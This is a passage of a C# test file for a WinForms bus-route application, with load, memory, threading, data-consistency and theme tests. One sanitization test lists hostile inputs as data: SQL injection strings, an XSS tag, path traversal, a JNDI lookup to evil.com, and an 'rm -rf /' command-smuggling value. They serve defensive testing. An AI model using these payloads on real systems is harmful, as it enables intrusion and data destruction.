                        var thread = new Thread(() =>
                        {
                            try
                            {
                                using var scope = _serviceProvider!.CreateScope();
                                var dashboardView = new DashboardOverviewView(scope.ServiceProvider);

                                var handle = dashboardView.Handle;
                                dashboardView.Dispose();

                                tcs.SetResult(handle != IntPtr.Zero);
                            }
                            catch (Exception ex)
                            {
                                tcs.SetException(ex);
                            }
                        });

                        thread.SetApartmentState(ApartmentState.STA);
                        thread.Start();

                        var result = tcs.Task.Result;
                        stopwatch.Stop();
                        results.Add(($"UI Creation {taskId}", stopwatch.ElapsedMilliseconds, result));
                    }
                    catch (Exception ex)
                    {
                        stopwatch.Stop();
                        results.Add(($"UI Creation {taskId}", stopwatch.ElapsedMilliseconds, false));
                        TestContext?.WriteLine($"UI load test {taskId} failed: {ex.Message}");
                    }
                }));
            }

            // Wait for all tasks to complete
            await Task.WhenAll(concurrentTasks);

            // Analyze results
            var successfulOps = results.Count(r => r.Success);
            var totalOps = results.Count;
            var avgDuration = results.Average(r => r.DurationMs);
            var maxDuration = results.Max(r => r.DurationMs);

            foreach (var result in results.OrderBy(r => r.Operation))
            {
                TestContext?.WriteLine($"{result.Operation}: {result.DurationMs}ms - {(result.Success ? "SUCCESS" : "FAILED")}");
            }

            TestContext?.WriteLine($"Load Test Summary: {successfulOps}/{totalOps} successful, Avg: {avgDuration:F1}ms, Max: {maxDuration}ms");

            // Assertions
            Assert.IsTrue(successfulOps >= totalOps * 0.8, $"At least 80% of operations should succeed under load. Actual: {successfulOps}/{totalOps}");
            Assert.IsTrue(avgDuration < 5000, $"Average operation time should be under 5 seconds. Actual: {avgDuration:F1}ms");
            Assert.IsTrue(maxDuration < 10000, $"No single operation should take over 10 seconds. Actual: {maxDuration}ms");
        }
        // =============================================================================
        // ADVANCED ROBUST TEST ADDITIONS - Memory, Threading, Security & Data Consistency
        // =============================================================================

        [TestMethod]
        [TestCategory("UI")]
        [TestCategory("MemoryManagement")]
        [TestCategory("AdvancedRobust")]
        public void TestDashboardMemoryLeakPrevention()
        {
            // Test for memory leaks during repeated UI creation/destruction
            var initialMemory = GC.GetTotalMemory(true);
            var creationCount = 10;
            var memoryMeasurements = new List<long>();

            for (int i = 0; i < creationCount; i++)
            {
                var tcs = new TaskCompletionSource<bool>();
                var thread = new Thread(() =>
                {
                    try
                    {
                        using var scope = _serviceProvider!.CreateScope();

                        // Create and immediately dispose to test cleanup
                        using (var dashboardView = new DashboardOverviewView(scope.ServiceProvider))
                        {
                            var handle = dashboardView.Handle; // Force creation
                        }

                        tcs.SetResult(true);
                    }
                    catch (Exception ex)
                    {
                        tcs.SetException(ex);
                    }
                });

                thread.SetApartmentState(ApartmentState.STA);
                thread.Start();
                tcs.Task.Wait(5000);

                // Force garbage collection and measure memory
                GC.Collect();
                GC.WaitForPendingFinalizers();
                GC.Collect();

                var currentMemory = GC.GetTotalMemory(false);
                memoryMeasurements.Add(currentMemory);

                TestContext?.WriteLine($"Iteration {i + 1}: Memory = {currentMemory:N0} bytes");
            }

            var finalMemory = GC.GetTotalMemory(true);
            var memoryIncrease = finalMemory - initialMemory;
            var memoryIncreasePercent = (double)memoryIncrease / initialMemory * 100;

            TestContext?.WriteLine($"Memory Analysis:");
            TestContext?.WriteLine($"  Initial: {initialMemory:N0} bytes");
            TestContext?.WriteLine($"  Final:   {finalMemory:N0} bytes");
            TestContext?.WriteLine($"  Increase: {memoryIncrease:N0} bytes ({memoryIncreasePercent:F1}%)");

            // Assert reasonable memory growth (less than 50% increase for 10 iterations)
            Assert.IsTrue(memoryIncreasePercent < 50,
                $"Memory increase should be less than 50% after {creationCount} iterations. Actual: {memoryIncreasePercent:F1}%");
        }

        [TestMethod]
        [TestCategory("UI")]
        [TestCategory("Threading")]
        [TestCategory("AdvancedRobust")]
        public void TestDashboardCrossThreadOperationsSafety()
        {
            // Test thread safety when accessing dashboard from multiple threads
            var testCompleted = new ManualResetEventSlim(false);
            var threadResults = new ConcurrentBag<(int ThreadId, bool Success, string Message)>();
            var dashboardView = (DashboardOverviewView?)null;
            Exception? mainException = null;            // Create dashboard on main STA thread
            var mainThread = new Thread(() =>
            {
                try
                {
                    using var scope = _serviceProvider!.CreateScope();
                    dashboardView = new DashboardOverviewView(scope.ServiceProvider);

                    var handle = dashboardView.Handle; // Force creation
                    threadResults.Add((Environment.CurrentManagedThreadId, handle != IntPtr.Zero, "Main thread creation"));

                    // Wait for worker threads to complete their operations
                    Thread.Sleep(3000);

                    // Test concurrent property access
                    var workerTasks = new List<Task>();
                    for (int i = 0; i < 5; i++)
                    {
                        var workerId = i;
                        workerTasks.Add(Task.Run(() =>
                        {
                            try
                            {
                                // Test thread-safe property access
                                var isDisposed = dashboardView.IsDisposed;
                                var isHandleCreated = dashboardView.IsHandleCreated; var bounds = dashboardView.InvokeRequired ? Rectangle.Empty : dashboardView.Bounds;

                                threadResults.Add((Environment.CurrentManagedThreadId, true,
                                    $"Worker {workerId}: Disposed={isDisposed}, HandleCreated={isHandleCreated}"));
                            }
                            catch (Exception ex)
                            {
                                threadResults.Add((Environment.CurrentManagedThreadId, false,
                                    $"Worker {workerId} failed: {ex.Message}"));
                            }
                        }));
                    }

                    Task.WaitAll(workerTasks.ToArray(), 2000);

                    dashboardView.Dispose();
                }
                catch (Exception ex)
                {
                    mainException = ex;
                }
                finally
                {
                    testCompleted.Set();
                }
            });

            mainThread.SetApartmentState(ApartmentState.STA);
            mainThread.Start();

            testCompleted.Wait(10000);

            // Analyze thread safety results
            var successfulOperations = threadResults.Count(r => r.Success);
            var totalOperations = threadResults.Count;

            foreach (var result in threadResults.OrderBy(r => r.ThreadId))
            {
                TestContext?.WriteLine($"Thread {result.ThreadId}: {(result.Success ? "SUCCESS" : "FAILED")} - {result.Message}");
            }

            if (mainException != null)
            {
                TestContext?.WriteLine($"Main thread exception: {mainException}");
            }

            // Assertions
            Assert.IsTrue(totalOperations >= 6, "Should have results from main thread + worker threads");
            Assert.IsTrue(successfulOperations >= totalOperations * 0.8,
                $"At least 80% of cross-thread operations should succeed. Actual: {successfulOperations}/{totalOperations}");
        }

        [TestMethod]
        [TestCategory("Data")]
        [TestCategory("Consistency")]
        [TestCategory("AdvancedRobust")]
        public async Task TestDataConsistencyUnderConcurrentModifications()
        {
            // Test data consistency when multiple operations modify the same entities concurrently
            var testRoutes = new List<Route>();
            var concurrentTasks = new List<Task>();
            var results = new ConcurrentBag<(string Operation, bool Success, string Details)>();

            try
            {
                // Create base test routes
                using (var scope = _serviceProvider!.CreateScope())
                {
                    var routeService = scope.ServiceProvider.GetRequiredService<IRouteService>();

                    for (int i = 0; i < 3; i++)
                    {
                        var route = new Route
                        {
                            RouteName = $"Consistency Test Route {i}",
                            RouteDate = DateTime.Today.AddDays(i),
                            AMStartingMileage = 1000 + i * 50,
                            AMEndingMileage = 1025 + i * 50,
                            AMRiders = 20,
                            PMRiders = 18
                        };

                        await routeService.CreateRouteAsync(route);
                        testRoutes.Add(route);
                    }
                }

                // Concurrent modification tasks
                foreach (var route in testRoutes)
                {
                    var routeId = route.Id;
                    // Task 1: Update AM riders
                    concurrentTasks.Add(Task.Run(async () =>
                    {
                        try
                        {
                            using var scope = _serviceProvider!.CreateScope();
                            var routeService = scope.ServiceProvider.GetRequiredService<IRouteService>();

                            var routeToUpdate = await routeService.GetRouteByIdAsync(routeId);
                            if (routeToUpdate != null)
                            {
                                routeToUpdate.AMRiders += 5;
                                await routeService.UpdateRouteAsync(routeToUpdate);
                                results.Add(("Update AM Riders", true, $"Route {routeId}: AMRiders += 5"));
                            }
                        }
                        catch (Exception ex)
                        {
                            results.Add(("Update AM Riders", false, $"Route {routeId}: {ex.Message}"));
                        }
                    }));

                    // Task 2: Update PM riders concurrently
                    concurrentTasks.Add(Task.Run(async () =>
                    {
                        try
                        {
                            using var scope = _serviceProvider!.CreateScope();
                            var routeService = scope.ServiceProvider.GetRequiredService<IRouteService>();

                            var routeToUpdate = await routeService.GetRouteByIdAsync(routeId);
                            if (routeToUpdate != null)
                            {
                                routeToUpdate.PMRiders += 3;
                                await routeService.UpdateRouteAsync(routeToUpdate);
                                results.Add(("Update PM Riders", true, $"Route {routeId}: PMRiders += 3"));
                            }
                        }
                        catch (Exception ex)
                        {
                            results.Add(("Update PM Riders", false, $"Route {routeId}: {ex.Message}"));
                        }
                    }));
                }

                // Wait for all concurrent operations
                await Task.WhenAll(concurrentTasks);

                // Verify final state consistency
                using (var scope = _serviceProvider!.CreateScope())
                {
                    var routeService = scope.ServiceProvider.GetRequiredService<IRouteService>();

                    foreach (var originalRoute in testRoutes)
                    {
                        var finalRoute = await routeService.GetRouteByIdAsync(originalRoute.Id);
                        if (finalRoute != null)
                        {
                            var amChange = finalRoute.AMRiders - originalRoute.AMRiders;
                            var pmChange = finalRoute.PMRiders - originalRoute.PMRiders;

                            results.Add(("Final State Check", true,
                                $"Route {originalRoute.Id}: AM={originalRoute.AMRiders}→{finalRoute.AMRiders} (+{amChange}), PM={originalRoute.PMRiders}→{finalRoute.PMRiders} (+{pmChange})"));
                        }
                    }
                }
            }
            finally
            {
                // Cleanup
                foreach (var route in testRoutes)
                {
                    try
                    {
                        using var scope = _serviceProvider!.CreateScope();
                        var routeService = scope.ServiceProvider.GetRequiredService<IRouteService>();
                        await routeService.DeleteRouteAsync(route.Id);
                    }
                    catch (Exception ex)
                    {
                        TestContext?.WriteLine($"Cleanup warning: {ex.Message}");
                    }
                }
            }

            // Analyze consistency results
            var successfulOps = results.Count(r => r.Success);
            var totalOps = results.Count;

            foreach (var result in results.OrderBy(r => r.Operation))
            {
                TestContext?.WriteLine($"{result.Operation}: {(result.Success ? "SUCCESS" : "FAILED")} - {result.Details}");
            }

            TestContext?.WriteLine($"Data Consistency Summary: {successfulOps}/{totalOps} operations successful");

            // Assertions - Most operations should succeed, but some conflicts are expected
            Assert.IsTrue(totalOps >= 9, "Should have attempted multiple concurrent operations"); // 3 routes × 2 ops each + final checks
            Assert.IsTrue(successfulOps >= totalOps * 0.6, $"At least 60% of operations should succeed (conflicts expected). Actual: {successfulOps}/{totalOps}");
        }

        [TestMethod]
        [TestCategory("Security")]
        [TestCategory("InputValidation")]
        [TestCategory("AdvancedRobust")]
        public async Task TestInputSanitizationAndSQLInjectionPrevention()
        {
            // Test security against malicious input patterns
            using var scope = _serviceProvider!.CreateScope();
            var routeService = scope.ServiceProvider.GetRequiredService<IRouteService>();

            var maliciousInputs = new[]
            {
                "'; DROP TABLE Routes; --",
                "<script>alert('xss')</script>",
                "../../etc/passwd",
                "%00%01%02%03",
                new string('A', 10000), // Buffer overflow attempt
                "' OR '1'='1",
                "UNION SELECT * FROM sys.tables",
                "${jndi:ldap://evil.com/a}",
                "{{7*7}}[[5*5]]",
                "\"; rm -rf /; #"
            };

            var sanitizationResults = new List<(string Input, bool Handled, string Result)>();

            foreach (var maliciousInput in maliciousInputs)
            {
                try
                {
                    var route = new Route
                    {
                        RouteName = maliciousInput,
                        RouteDate = DateTime.Today,
                        AMStartingMileage = 1000,
                        AMEndingMileage = 1025,
                        AMRiders = 20,
                        PMRiders = 18
                    };

                    await routeService.CreateRouteAsync(route);

                    // If creation succeeded, check what was actually stored
                    var createdRoute = await routeService.GetRouteByIdAsync(route.Id);
                    var storedName = createdRoute?.RouteName ?? "";

                    var wasSanitized = storedName != maliciousInput;
                    sanitizationResults.Add((maliciousInput, true,
                        wasSanitized ? $"Sanitized: '{storedName}'" : "Stored as-is (potential security risk)"));

                    // Cleanup
                    await routeService.DeleteRouteAsync(route.Id);
                }
                catch (Exception ex)
                {
                    // Input was rejected - this is good for security
                    sanitizationResults.Add((maliciousInput, true, $"Rejected: {ex.GetType().Name}"));
                }
            }            // Analyze security results
            foreach (var result in sanitizationResults)
            {
                TestContext?.WriteLine($"Input: '{result.Input.Substring(0, Math.Min(50, result.Input.Length))}...'");
                TestContext?.WriteLine($"  Result: {result.Result}");
            }

            var handledInputs = sanitizationResults.Count(r => r.Handled);
            var totalInputs = sanitizationResults.Count;

            TestContext?.WriteLine($"Security Test Summary: {handledInputs}/{totalInputs} malicious inputs handled safely");

            // All malicious inputs should be either sanitized or rejected
            Assert.AreEqual(totalInputs, handledInputs, "All malicious inputs should be handled safely");
        }

        [TestMethod]
        [TestCategory("UI")]
        [TestCategory("ErrorRecovery")]
        [TestCategory("AdvancedRobust")]
        public void TestDashboardErrorRecoveryAndGracefulDegradation()
        {
            // Test dashboard behavior when components fail during runtime
            var testCompleted = new ManualResetEventSlim(false);
            var recoveryResults = new List<string>();
            Exception? testException = null;

            var thread = new Thread(() =>
            {
                try
                {
                    using var scope = _serviceProvider!.CreateScope();
                    var logger = scope.ServiceProvider.GetRequiredService<ILogger<DashboardView>>();
                    var dashboardView = new DashboardView(scope.ServiceProvider, logger);

                    using var form = new Form();
                    form.WindowState = FormWindowState.Minimized;
                    form.ShowInTaskbar = false;
                    form.Controls.Add(dashboardView);
                    dashboardView.Dock = DockStyle.Fill;

                    var handle = form.Handle;
                    form.Show();
                    Application.DoEvents();

                    recoveryResults.Add("Dashboard created successfully");

                    // Test 1: Simulate control disposal during operation
                    try
                    {
                        foreach (Control control in dashboardView.Controls)
                        {
                            if (control is TableLayoutPanel mainLayout)
                            {
                                foreach (Control child in mainLayout.Controls)
                                {
                                    if (child is Panel panel && panel.Controls.Count > 0)
                                    {
                                        // Try to access disposed control (simulate runtime error)
                                        var firstControl = panel.Controls[0];
                                        var bounds = firstControl.Bounds; // Should handle gracefully
                                        recoveryResults.Add($"Accessed control bounds: {firstControl.GetType().Name}");
                                        break;
                                    }
                                }
                                break;
                            }
                        }
                    }
                    catch (Exception controlEx)
                    {
                        recoveryResults.Add($"Control access error handled: {controlEx.GetType().Name}");
                    }

                    // Test 2: Simulate forced GC during UI operations
                    try
                    {
                        GC.Collect();
                        GC.WaitForPendingFinalizers();
                        GC.Collect();

                        Application.DoEvents();
                        recoveryResults.Add("Survived forced garbage collection");
                    }
                    catch (Exception gcEx)
                    {
                        recoveryResults.Add($"GC error: {gcEx.Message}");
                    }

                    // Test 3: Test continued functionality after errors
                    try
                    {
                        var isResponsive = dashboardView.IsHandleCreated && !dashboardView.IsDisposed;
                        recoveryResults.Add($"Dashboard responsive after errors: {isResponsive}");
                    }
                    catch (Exception responsiveEx)
                    {
                        recoveryResults.Add($"Responsiveness check failed: {responsiveEx.Message}");
                    }

                    form.Hide();
                    Application.DoEvents();
                }
                catch (Exception ex)
                {
                    testException = ex;
                    recoveryResults.Add($"Major error recovery test failed: {ex.Message}");
                }
                finally
                {
                    testCompleted.Set();
                }
            });

            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();

            testCompleted.Wait(10000);

            if (thread.IsAlive)
            {
                thread.Join(1000);
            }

            // Log recovery test results
            foreach (var result in recoveryResults)
            {
                TestContext?.WriteLine(result);
            }

            if (testException != null)
            {
                TestContext?.WriteLine($"Recovery test exception: {testException}");
            }

            // Assertions
            Assert.IsTrue(recoveryResults.Any(r => r.Contains("Dashboard created successfully")),
                "Dashboard should create successfully");
            Assert.IsTrue(recoveryResults.Any(r => r.Contains("Survived") || r.Contains("responsive")),
                "Dashboard should demonstrate error recovery capabilities");

            var errorHandlingCount = recoveryResults.Count(r => r.Contains("handled") || r.Contains("Survived"));
            TestContext?.WriteLine($"Error recovery scenarios handled: {errorHandlingCount}");
        }

        #region UI Consistency and Theme Inheritance Tests        [TestMethod]
        public void TestFormThemeInheritanceAndConsistency()
        {
            var inheritanceResults = new List<string>();
            Exception? testException = null;

            var testCompleted = new ManualResetEventSlim(false);

            var thread = new Thread(() =>
            {
                try
                {
                    inheritanceResults.Add("Starting theme inheritance tests");

                    // Test multiple themes
                    var themesToTest = _themesToTest;
                    var formsToTest = new Dictionary<string, Type>
                    {
                        ["Dashboard"] = typeof(BusBus.UI.Dashboard),
                        ["TransportFormView"] = typeof(BusBus.UI.Forms.TransportFormView)
                    };

                    foreach (var themeName in themesToTest)
                    {
                        inheritanceResults.Add($"Testing theme: {themeName}");

                        // Switch theme
                        switch (themeName)
                        {
                            case "Light":
                                BusBus.UI.Core.ThemeManager.SetTheme("Light");
                                break;
                            case "Dark":
                                BusBus.UI.Core.ThemeManager.SetTheme("Dark");
                                break;
                                // Remove Accessible if not registered
                        }
                        Application.DoEvents();

                        foreach (var formInfo in formsToTest)
                        {
                            try
                            {
                                var actualForm = CreateFormInstance(formInfo.Value) as Form;
                                if (actualForm != null)
                                {
                                    actualForm.Show();
                                    Application.DoEvents();

                                    // Test theme inheritance
                                    var isThemeApplied = VerifyThemeApplication(actualForm, themeName);
                                    inheritanceResults.Add($"{formInfo.Key} theme inheritance ({themeName}): {isThemeApplied}");

                                    // Test button consistency
                                    var buttonConsistency = VerifyButtonConsistency(actualForm);
                                    inheritanceResults.Add($"{formInfo.Key} button consistency: {buttonConsistency}");

                                    // Test control positioning
                                    var positionConsistency = VerifyControlPositioning(actualForm);
                                    inheritanceResults.Add($"{formInfo.Key} position consistency: {positionConsistency}");

                                    actualForm.Hide();
                                    actualForm.Dispose();
                                }
                            }
                            catch (Exception ex)
                            {
                                inheritanceResults.Add($"Error testing {formInfo.Key} with {themeName}: {ex.Message}");
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    testException = ex;
                    inheritanceResults.Add($"Theme inheritance test failed: {ex.Message}");
                }
                finally
                {
                    testCompleted.Set();
                }
            });

            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();

            testCompleted.Wait(15000);

            if (thread.IsAlive)
            {
                thread.Join(1000);
            }

            // Log results
            foreach (var result in inheritanceResults)
            {
                TestContext?.WriteLine(result);
            }

            if (testException != null)
            {
                TestContext?.WriteLine($"Theme inheritance test exception: {testException}");
            }

            // Assertions
            Assert.IsTrue(inheritanceResults.Any(r => r.Contains("theme inheritance") && r.Contains("PASS")),
                "At least one form should properly inherit theme");
            Assert.IsTrue(inheritanceResults.Any(r => r.Contains("button consistency") && r.Contains("PASS")),
                "Button consistency should be maintained");

            var passCount = inheritanceResults.Count(r => r.Contains("PASS"));
            TestContext?.WriteLine($"UI consistency checks passed: {passCount}");
        }

        [TestMethod]
        public async Task TestCrossFormThemeUpdates()
        {
            var themeUpdateResults = new List<string>();
            Exception? testException = null;

            var testCompleted = new TaskCompletionSource<bool>();

            var thread = new Thread(async () =>
            {
                try
                {


                    var forms = new List<Form>();

                    try
                    {
                        // Create multiple forms
                        var dashboardForm = CreateFormInstance(typeof(BusBus.UI.Dashboard)) as Form;
                        var transportForm = CreateFormInstance(typeof(BusBus.UI.Forms.TransportFormView)) as Form;

                        if (dashboardForm != null) forms.Add(dashboardForm);
                        if (transportForm != null) forms.Add(transportForm);

                        // Show all forms
                        foreach (var form in forms)
                        {
                            form.Show();
                            Application.DoEvents();
                        }                        // Test theme switching with multiple forms open
                        var themes = new BusBus.UI.Core.Theme[]
                        {
                            new BusBus.UI.Core.LightTheme(),
                            new BusBus.UI.Core.DarkTheme()
                        };

                        foreach (var theme in themes)
                        {
                            var themeName = theme.GetType().Name.Replace("Theme", "");
                            BusBus.UI.Core.ThemeManager.SetTheme(themeName);
                            Application.DoEvents();
                            await NewMethod(); // Allow theme propagation
                            themeUpdateResults.Add($"Switched to {themeName}");

                            // Verify all forms updated
                            for (int i = 0; i < forms.Count; i++)
                            {
                                var form = forms[i];
                                if (!form.IsDisposed)
                                {
                                    var isUpdated = VerifyThemeApplication(form, themeName);
                                    themeUpdateResults.Add($"Form {i} updated to {themeName}: {isUpdated}");
                                }
                            }
                        }

                        // Test simultaneous theme changes
                        var simultaneousUpdates = 0;
                        for (int i = 0; i < 5; i++)
                        {
                            BusBus.UI.Core.ThemeManager.SetTheme(i % 2 == 0 ? "Light" : "Dark");
                            Application.DoEvents();
                            simultaneousUpdates++;
                        }

                        themeUpdateResults.Add($"Simultaneous theme changes completed: {simultaneousUpdates}");

                        // Verify final consistency
                        var finalConsistency = true;
                        for (int i = 0; i < forms.Count - 1; i++)
                        {
                            if (!forms[i].IsDisposed && !forms[i + 1].IsDisposed)
                            {
                                var form1BackColor = GetFormBackgroundColor(forms[i]);
                                var form2BackColor = GetFormBackgroundColor(forms[i + 1]);

                                if (form1BackColor != form2BackColor)
                                {
                                    finalConsistency = false;
                                    themeUpdateResults.Add($"Color inconsistency: Form {i} vs Form {i + 1}");
                                }
                            }
                        }

                        themeUpdateResults.Add($"Final theme consistency across forms: {(finalConsistency ? "PASS" : "FAIL")}");
                    }
                    finally
                    {
                        // Clean up forms
                        foreach (var form in forms)
                        {
                            if (!form.IsDisposed)
                            {
                                form.Hide();
                                form.Dispose();
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    testException = ex;
                    themeUpdateResults.Add($"Cross-form theme update test failed: {ex.Message}");
                }
                finally
                {
                    testCompleted.SetResult(true);
                }
            });

            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();

            await testCompleted.Task.ConfigureAwait(false);

            if (thread.IsAlive)
            {
                thread.Join(1000);
            }

            // Log results
            foreach (var result in themeUpdateResults)
            {
                TestContext?.WriteLine(result);
            }

            if (testException != null)
            {
                TestContext?.WriteLine($"Cross-form theme update exception: {testException}");
            }

            // Assertions
            Assert.IsTrue(themeUpdateResults.Any(r => r.Contains("Switched to")),
                "Theme switching should occur");
            Assert.IsTrue(themeUpdateResults.Any(r => r.Contains("updated to") && r.Contains("PASS")),
                "At least one form should update properly");
            Assert.IsTrue(themeUpdateResults.Any(r => r.Contains("Final theme consistency") && r.Contains("PASS")),
                "All forms should have consistent theming");
        }

        private static async Task NewMethod()
        {
            await Task.Delay(100);
        }

        [TestMethod]
        public void TestFormTemplateCompliance()
        {
            var templateResults = new List<string>();
            Exception? testException = null;

            var testCompleted = new ManualResetEventSlim(false);

            var thread = new Thread(() =>
            {
                try
                {
                    var formsToTest = new Dictionary<string, Type>
                    {
                        ["Dashboard"] = typeof(BusBus.UI.Dashboard),
                        ["TransportFormView"] = typeof(BusBus.UI.Forms.TransportFormView)
                    };

                    foreach (var formInfo in formsToTest)
                    {
                        try
                        {
                            var form = CreateFormInstance(formInfo.Value);
                            if (form is Form actualForm)
                            {
                                actualForm.Show();
                                Application.DoEvents();

                                // Test if form uses HighQualityFormTemplate
                                var usesTemplate = IsUsingFormTemplate(actualForm);
                                templateResults.Add($"{formInfo.Key} uses form template: {usesTemplate}");

                                // Test standard control layout patterns
                                var hasStandardLayout = VerifyStandardLayout(actualForm);
                                templateResults.Add($"{formInfo.Key} standard layout: {hasStandardLayout}");

                                // Test button positioning patterns
                                var buttonLayout = VerifyButtonLayoutPattern(actualForm);
                                templateResults.Add($"{formInfo.Key} button layout pattern: {buttonLayout}");

                                // Test control spacing consistency
                                var spacingConsistency = VerifyControlSpacing(actualForm);
                                templateResults.Add($"{formInfo.Key} spacing consistency: {spacingConsistency}");

                                // Test accessibility compliance
                                var accessibilityCompliance = VerifyAccessibilityCompliance(actualForm);
                                templateResults.Add($"{formInfo.Key} accessibility compliance: {accessibilityCompliance}");

                                actualForm.Hide();
                                actualForm.Dispose();
                            }
                        }
                        catch (Exception ex)
                        {
                            templateResults.Add($"Error testing {formInfo.Key} template compliance: {ex.Message}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    testException = ex;
                    templateResults.Add($"Form template compliance test failed: {ex.Message}");
                }
                finally
                {
                    testCompleted.Set();
                }
            });

            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();

            testCompleted.Wait(15000);

            if (thread.IsAlive)
            {
                thread.Join(1000);
            }

            // Log results
            foreach (var result in templateResults)
            {
                TestContext?.WriteLine(result);
            }

            if (testException != null)
            {
                TestContext?.WriteLine($"Template compliance test exception: {testException}");
            }

            // Assertions
            Assert.IsTrue(templateResults.Any(r => r.Contains("uses form template") && r.Contains("PASS")),
                "At least one form should use the standard template");
            Assert.IsTrue(templateResults.Any(r => r.Contains("standard layout") && r.Contains("PASS")),
                "Forms should follow standard layout patterns");
            Assert.IsTrue(templateResults.Any(r => r.Contains("button layout pattern") && r.Contains("PASS")),
                "Button layout should be consistent");

            var complianceCount = templateResults.Count(r => r.Contains("PASS"));
            TestContext?.WriteLine($"Template compliance checks passed: {complianceCount}");
        }

        [TestMethod]
        public void TestVisualConsistencyAcrossForms()
        {
            var visualResults = new List<string>();
            Exception? testException = null;

            var testCompleted = new ManualResetEventSlim(false);

            var thread = new Thread(() =>
            {
                try
                {
                    var forms = new List<(string name, Form form)>();

                    try
                    {
                        // Create multiple forms for comparison
                        var dashboardForm = CreateFormInstance(typeof(BusBus.UI.Dashboard)) as Form;
                        var transportForm = CreateFormInstance(typeof(BusBus.UI.Forms.TransportFormView)) as Form;

                        if (dashboardForm != null) forms.Add(("Dashboard", dashboardForm));
                        if (transportForm != null) forms.Add(("TransportFormView", transportForm));

                        // Show all forms
                        foreach (var (name, form) in forms)
                        {
                            form.Show();
                            Application.DoEvents();
                        }

                        if (forms.Count >= 2)
                        {
                            // Compare visual properties between forms
                            var (name1, form1) = forms[0];
                            var (name2, form2) = forms[1];

                            // Compare background colors
                            var bgColor1 = GetFormBackgroundColor(form1);
                            var bgColor2 = GetFormBackgroundColor(form2);
                            var bgColorConsistent = bgColor1 == bgColor2;
                            visualResults.Add($"Background color consistency ({name1} vs {name2}): {(bgColorConsistent ? "PASS" : "FAIL")}");

                            // Compare font properties
                            var fontConsistency = CompareFontProperties(form1, form2);
                            visualResults.Add($"Font consistency ({name1} vs {name2}): {fontConsistency}");

                            // Compare button styles
                            var buttonStyleConsistency = CompareButtonStyles(form1, form2);
                            visualResults.Add($"Button style consistency ({name1} vs {name2}): {buttonStyleConsistency}");

                            // Compare control spacing patterns
                            var spacingConsistency = CompareControlSpacing(form1, form2);
                            visualResults.Add($"Control spacing consistency ({name1} vs {name2}): {spacingConsistency}");

                            // Test for common visual elements
                            var commonElementsCheck = VerifyCommonVisualElements(forms);
                            visualResults.Add($"Common visual elements present: {commonElementsCheck}");

                            // Test glassmorphism consistency if enabled
                            var glassmorphismConsistency = VerifyGlassmorphismConsistency(forms);
                            visualResults.Add($"Glassmorphism consistency: {glassmorphismConsistency}");
                        }
                        else
                        {
                            visualResults.Add("Insufficient forms created for visual comparison");
                        }
                    }
                    finally
                    {
                        // Clean up forms
                        foreach (var (_, form) in forms)
                        {
                            if (!form.IsDisposed)
                            {
                                form.Hide();
                                form.Dispose();
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    testException = ex;
                    visualResults.Add($"Visual consistency test failed: {ex.Message}");
                }
                finally
                {
                    testCompleted.Set();
                }
            });

            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();

            testCompleted.Wait(15000);

            if (thread.IsAlive)
            {
                thread.Join(1000);
            }

            // Log results
            foreach (var result in visualResults)
            {
                TestContext?.WriteLine(result);
            }

            if (testException != null)
            {
                TestContext?.WriteLine($"Visual consistency test exception: {testException}");
            }

            // Assertions
            Assert.IsTrue(visualResults.Any(r => r.Contains("consistency") && r.Contains("PASS")),
                "At least one visual consistency check should pass");

            var consistencyPassCount = visualResults.Count(r => r.Contains("consistency") && r.Contains("PASS"));
            TestContext?.WriteLine($"Visual consistency checks passed: {consistencyPassCount}");
        }

        [TestMethod]
        public void TestResponsiveThemeChanges()
        {
            var responsiveResults = new List<string>();
            Exception? testException = null;

            var testCompleted = new ManualResetEventSlim(false);

            var thread = new Thread(async () =>
            {
                try
                {


                    var form = CreateFormInstance(typeof(BusBus.UI.Dashboard));
                    if (form != null)
                    {
                        form.Show();
                        Application.DoEvents();

                        // Test rapid theme changes
                        var rapidChanges = 0;
                        var themes = new BusBus.UI.Core.Theme[]
                        {
                            new BusBus.UI.Core.LightTheme(),
                            new BusBus.UI.Core.DarkTheme()
                        };

                        for (int i = 0; i < 10; i++)
                        {
                            var theme = themes[i % themes.Length];
                            BusBus.UI.Core.ThemeManager.SetTheme(theme);
                            Application.DoEvents();

                            // Verify form is still responsive
                            var isResponsive = form.IsHandleCreated && !form.IsDisposed;
                            if (isResponsive)
                            {
                                rapidChanges++;
                                responsiveResults.Add($"Rapid theme change {i + 1}: PASS");
                            }
                            else
                            {
                                responsiveResults.Add($"Rapid theme change {i + 1}: FAIL - Form unresponsive");
                            }

                            // Small delay to simulate real-world usage
                            await Task.Delay(50);
                        }

                        responsiveResults.Add($"Rapid theme changes handled: {rapidChanges}/10");

                        // Test theme change during form operations
                        var operationResults = new List<bool>();
                        for (int i = 0; i < 5; i++)
                        {
                            try
                            {
                                // Simulate some form operations
                                form.Invalidate();
                                Application.DoEvents();

                                // Change theme during operation
                                BusBus.UI.Core.ThemeManager.SetTheme(i % 2 == 0 ? "Light" : "Dark");
                                Application.DoEvents();

                                // Verify form integrity
                                var operationSuccess = form.IsHandleCreated && !form.IsDisposed;
                                operationResults.Add(operationSuccess);

                                responsiveResults.Add($"Theme change during operation {i + 1}: {(operationSuccess ? "PASS" : "FAIL")}");
                            }
                            catch (Exception ex)
                            {
                                operationResults.Add(false);
                                responsiveResults.Add($"Theme change during operation {i + 1}: FAIL - {ex.Message}");
                            }
                        }

                        var successfulOperations = operationResults.Count(r => r);
                        responsiveResults.Add($"Successful operation theme changes: {successfulOperations}/5");

                        form.Hide();
                        form.Dispose();
                    }
                }
                catch (Exception ex)
                {
                    testException = ex;
                    responsiveResults.Add($"Responsive theme change test failed: {ex.Message}");
                }
                finally
                {
                    testCompleted.Set();
                }
            });

            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();

            testCompleted.Wait(15000);

            if (thread.IsAlive)
            {
                thread.Join(1000);
            }

            // Log results
            foreach (var result in responsiveResults)
            {
                TestContext?.WriteLine(result);
            }

            if (testException != null)
            {
                TestContext?.WriteLine($"Responsive theme test exception: {testException}");
            }

            // Assertions
